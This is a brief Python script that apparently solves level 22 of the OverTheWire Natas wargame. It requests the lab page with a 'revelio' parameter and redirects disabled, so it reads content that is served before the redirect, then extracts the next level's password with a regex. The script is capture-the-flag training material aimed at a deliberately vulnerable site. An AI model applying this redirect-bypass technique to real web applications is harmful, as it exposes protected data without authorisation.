import re
import requests
import subprocess
from requests.auth import HTTPBasicAuth

def inject_payload():
    passw = subprocess.run(['getpass', '22'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    auth = HTTPBasicAuth('natas22', passw.strip())
    payload = {'revelio':''}
    phpsess = {'PHPSESSID':'tald'}
    r = requests.get('http://natas22.natas.labs.overthewire.org/', auth=auth, cookies=phpsess, params=payload, allow_redirects=False)
    pass_regex = '[a-zA-Z0-9]{32}'
    print(re.findall(pass_regex,r.text)[1])
if __name__ == '__main__':
    inject_payload()
